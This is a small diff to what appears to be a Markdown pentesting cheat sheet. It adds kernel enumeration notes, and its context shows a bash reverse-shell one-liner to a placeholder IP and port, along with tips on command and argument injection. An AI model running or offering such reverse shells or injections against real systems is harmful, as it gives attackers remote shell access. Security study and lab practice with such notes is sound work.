@@ -144,6 +144,10 @@ Check /etc/ssh/ssh_config for the ssh config
 - Senders:
   - Bash: `bash  -i >& /dev/tcp/[IP]/[PORT] 0>&1 `
 
+## Kernel:
+- `uname -a` -> get kernel version
+- ip_xfrm_state -> shows the state of the ipsec connections
+
 ## Misc
 - If arguments are not in quotes, we can inject commands
 - If command injection is not possible, we an inject arguments to a command
